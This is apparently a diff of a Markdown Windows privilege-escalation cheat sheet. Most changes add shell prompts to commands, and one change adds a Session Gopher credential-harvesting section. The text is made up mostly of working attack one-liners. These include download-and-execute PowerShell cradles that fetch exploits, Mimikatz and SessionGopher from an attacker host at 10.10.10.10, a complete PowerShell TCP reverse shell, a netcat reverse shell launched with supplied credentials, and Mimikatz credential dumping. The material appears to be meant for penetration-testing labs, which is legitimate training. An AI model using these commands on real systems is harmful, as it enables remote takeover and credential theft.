@@ -63,38 +63,38 @@ Access is denied.
 Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it.
 If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script:
 ```
-echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
+CMD C:\> echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
 ```
 If Windows is a newer version (Windows 10 or Server 2016), try the following code:
 ```
-echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
+CMD C:\> echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
 ```
 
 Now try to download a file to the local path:  
 ```
-cscript dl.vbs "http://10.10.10.10/archive.zip"
+CMD C:\> cscript dl.vbs "http://10.10.10.10/archive.zip"
 ```
 
 ### Uploading Files with PowerShell  
 
 Test to see if we can run Powershell:
-```
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"
+```cmd
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"
 ```
 
 Test to see if we can run Powershell Version 2:
-```
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
+```cmd
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
 ```
 
 Try to download a file from a remote server to the windows temp folder from the Windows command line:
-```
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
+```cmd
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
 ```
 
 Or from a PowerShell... shell:
-```
-IEX(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
+```powershell
+PS C:\> IEX(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
 ```
 
 ### Uploading Files with Python
@@ -163,13 +163,13 @@ nc -nlvp 4444
 ```
 And Execute the remote powershell script hosted on your Kali SimpleHTTPServer 
 ```cmd
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
 ```
 
 ### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell:  
 You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
-```
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
+```cmd
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
 ```
 
 ### Netcat Reverseshell Oneliners for Windows
@@ -208,7 +208,7 @@ Serving HTTP on 0.0.0.0 port 80 ...
 ```
 Now we will need to transfer the file to our remote windows box:
 ```
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/windows-privesc-check2.exe\", \"C:\\Users\\Public\\Downloads\\windows-privesc-check2.exe\");
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/windows-privesc-check2.exe\", \"C:\\Users\\Public\\Downloads\\windows-privesc-check2.exe\");
 ```
 And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
 ```
@@ -271,7 +271,38 @@ Running J.A.W.S. Enumeration
         - Gathering Installed Software
 ```
 
+### Fireeye Session Gopher
+Leveraging credentials is still the most common ways of privledge escalation in Windows environments. Session Gopher is a PowerShell script designed to automaticlly harvest credentials from commonly used applications.
 
+To run Session Gopher, we will first need to pull down the latest version from the Fireeye github repository:
+```
+git clone https://github.com/fireeye/SessionGopher
+Cloning into 'SessionGopher'...
+remote: Enumerating objects: 48, done.
+Unpacking objects: 100% (48/48), done.
+remote: Total 48 (delta 0), reused 0 (delta 0), pack-reused 48
+```
+Next we can serve it up on our local KALI instance by using the simple python HTTP server:
+```
+root@kali:~/tools# cd SessionGopher/
+root@kali:~/tools/SessionGopher# ls
+README.md  SessionGopher.ps1
+root@kali:~/tools/SessionGopher# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+Finally we can file-lessly execute it from our remote Windows shell:
+```
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/SessionGopher.ps1')); Invoke-SessionGopher -Thorough"
+```
+Or from a Windows Powershell:
+```powershell
+PS C:\> IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/SessionGopher.ps1')
+```
+Or we can download and run it:
+```cmd
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/SessionGopher.ps1\", \"C:\\Users\\Public\\Downloads\\SessionGopher.ps1\");
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "& { . .\SessionGopher.ps1; Invoke-SessionGopher -Thorough}"
+```
 ## Running Mimikatz
 Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more.  
 https://github.com/gentilkiwi/mimikatz  
@@ -288,7 +319,7 @@ root@kali:~/test# unzip mimikatz_trunk.zip
 ```
 Now we will need to copy the 3 files (win32 or x64 depending on the OS) required to run Mimikatz to the remote server.
 ```
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimidrv.sys\", \"C:\\Users\\Public\\Downloads\\mimidrv.sys\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimikatz.exe\", \"C:\\Users\\Public\\Downloads\\mimikatz.exe\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimilib.dll\", \"C:\\Users\\Public\\Downloads\\mimilib.dll\")"
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimidrv.sys\", \"C:\\Users\\Public\\Downloads\\mimidrv.sys\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimikatz.exe\", \"C:\\Users\\Public\\Downloads\\mimikatz.exe\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimilib.dll\", \"C:\\Users\\Public\\Downloads\\mimilib.dll\")"
 ```
 Now, if we dont have an overly interactive shell, we will want to execute Mimikatz without the built in CLI by passing the correct parameters to the executable.  We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output).
 ```
@@ -311,7 +342,7 @@ wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_s
 ```
 Fileless execution of Mimikatz from remotely hosted server:
 ```
-IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
+PS C:\> IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
 ```
 
 ## Windows Kernel Exploits
@@ -362,15 +393,15 @@ The default version of the MS16-032 script will create a Pop-up CMD.exe window o
 
 On the remote host execute the exploit:
 ```cmd
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1'))"
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1'))"
 ```
 Or from a Windows Powershell:
 ```powershell
-IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1')
+PS C:\> IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1')
 ```
 Or if you wanted to upload the exploit, you can always run it like this:
 ```powershell
-powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+PS C:\> powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
 ```
 On our Kali machine we create the reverse shell and ... BOOM! Root dance.
 ```
@@ -411,19 +442,15 @@ PowerShell can also be used to launch a process as another user. The following s
 ```
 Next run this script using powershell.exe:
 ```powershell
-powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
+PS C:\> powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
 ```
 Or run it as a handy one-liner from the Windows command line:
 ```
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command '$username = "Admin"; $password = "PASSWORD";  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Users\Public\Downloads\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.10.10.10", "4444", "-e", "cmd.exe") -WorkingDirectory C:\Users\Public\Downloads;'
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command '$username = "Admin"; $password = "PASSWORD";  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Users\Public\Downloads\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.10.10.10", "4444", "-e", "cmd.exe") -WorkingDirectory C:\Users\Public\Downloads;'
 ```
 
-
-*Easy*
-
-**Passwords**
-Passwords can be one of the easiest methods of privledge escalation and there are some tools that can help with this process.
-
+# Other files
+Here are few other handy scripts and things...
 
 **CopyAndPasteFileDownloader.bat**
 
